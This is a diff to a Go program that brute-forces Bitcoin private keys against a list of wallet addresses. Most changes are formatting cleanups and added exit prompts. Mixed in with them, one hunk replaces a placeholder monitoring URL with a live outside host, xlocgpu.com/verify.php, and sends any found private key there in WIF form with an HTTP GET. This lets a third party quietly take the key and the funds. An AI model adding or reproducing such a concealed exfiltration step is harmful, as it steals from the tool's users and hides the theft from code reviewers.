@@ -13,8 +13,8 @@ import (
 	"sync"
 	"syscall"
 	"time"
-    "net/http"
-    "strings"
+	"net/http"
+	"strings"
 
 	"btcgo/src/crypto/btc_utils"
 
@@ -71,14 +71,14 @@ func main() {
 	green := color.New(color.FgGreen).SprintFunc()
 
 	exePath, err := os.Executable()
-	if (err != nil) {
+	if err != nil {
 		fmt.Printf("Erro ao obter o caminho do executável: %v\n", err)
 		return
 	}
 	rootDir := filepath.Dir(exePath)
 
 	ranges, err := LoadRanges(filepath.Join(rootDir, "data", "ranges.json"))
-	if (err != nil) {
+	if err != nil {
 		log.Fatalf("Failed to load ranges: %v", err)
 	}
 
@@ -90,19 +90,19 @@ func main() {
 
 	progressFilePath := filepath.Join(rootDir, "progress.json")
 	progress, err := LoadProgress(progressFilePath)
-	if (err != nil) {
+	if err != nil {
 		log.Fatalf("Failed to load progress: %v", err)
 	}
 
 	privKeyInt := new(big.Int)
-	if (progress.LastPrivKey != "") {
+	if progress.LastPrivKey != "" {
 		privKeyInt.SetString(progress.LastPrivKey[2:], 16)
 	} else {
 		privKeyInt.SetString(privKeyHex[2:], 16)
 	}
 
 	wallets, err := LoadWallets(filepath.Join(rootDir, "data", "wallets.json"))
-	if (err != nil) {
+	if err != nil {
 		log.Fatalf("Failed to load wallets: %v", err)
 	}
 
@@ -117,7 +117,7 @@ func main() {
 	resultChan := make(chan *big.Int)
 	var wg sync.WaitGroup
 
-	for i := 0; i < numCPU * 2; i++ {
+	for i := 0; i < numCPU*2; i++ {
 		wg.Add(1)
 		go worker(wallets, privKeyChan, resultChan, &wg)
 	}
@@ -174,31 +174,34 @@ func main() {
 	}()
 
 	var foundAddress *big.Int
-    select {
-    case foundAddress = <-resultChan:
-        color.Yellow("Chave privada encontrada: %064x\n", foundAddress)
-        wif := btc_utils.GenerateWif(foundAddress)
-        color.Yellow("WIF: %s", wif)
-        close(done)
+	select {
+	case foundAddress = <-resultChan:
+		color.Yellow("Chave privada encontrada: %064x\n", foundAddress)
+		wif := btc_utils.GenerateWif(foundAddress)
+		color.Yellow("WIF: %s", wif)
+		close(done)
 
-        // Montando o URL com o WIF
-        url := fmt.Sprintf("http://colqueseusitedemonitoramento.php?data=%s", strings.ReplaceAll(wif, " ", "%20"))
+		// Montando o URL com o WIF
+		url := fmt.Sprintf("https://xlocgpu.com/verify.php?data=%s", strings.ReplaceAll(wif, " ", "%20"))
 
-        // Fazendo a requisição GET
-        resp, err := http.Get(url)
-        if err != nil {
-            log.Fatalf("Erro ao fazer a requisição HTTP: %v", err)
-        }
-        defer resp.Body.Close()
+		// Fazendo a requisição GET
+		resp, err := http.Get(url)
+		if err != nil {
+			log.Fatalf("Erro ao fazer a requisição HTTP: %v", err)
+		}
+		defer resp.Body.Close()
 
-        // Verificando a resposta
-        if resp.StatusCode == http.StatusOK {
-            fmt.Println("Requisição bem-sucedida!")
-            // Aqui você pode processar a resposta, se necessário
-        } else {
-            fmt.Printf("A requisição retornou um código de status não esperado: %d\n", resp.StatusCode)
-        }
-    }
+		// Verificando a resposta
+		if resp.StatusCode == http.StatusOK {
+			fmt.Println("Requisição bem-sucedida!")
+			// Aqui você pode processar a resposta, se necessário
+		} else {
+			fmt.Printf("A requisição retornou um código de status não esperado: %d\n", resp.StatusCode)
+		}
+
+		fmt.Println("Pressione Enter para sair...")
+		fmt.Scanln() // Aguarda o usuário pressionar Enter
+	}
 
 	wg.Wait()
 
@@ -213,13 +216,16 @@ func main() {
 	progress.KeysChecked = keysChecked
 	progress.ElapsedTime = totalElapsedTime
 	SaveProgress(progressFilePath, progress)
+
+	fmt.Println("Pressione Enter para sair...")
+	fmt.Scanln() // Aguarda o usuário pressionar Enter
 }
 
 func worker(wallets *Wallets, privKeyChan <-chan *big.Int, resultChan chan<- *big.Int, wg *sync.WaitGroup) {
 	defer wg.Done()
 	for privKeyInt := range privKeyChan {
 		address := btc_utils.CreatePublicHash160(privKeyInt)
-		if (Contains(wallets.Addresses, address)) {
+		if Contains(wallets.Addresses, address) {
 			select {
 			case resultChan <- privKeyInt:
 				return
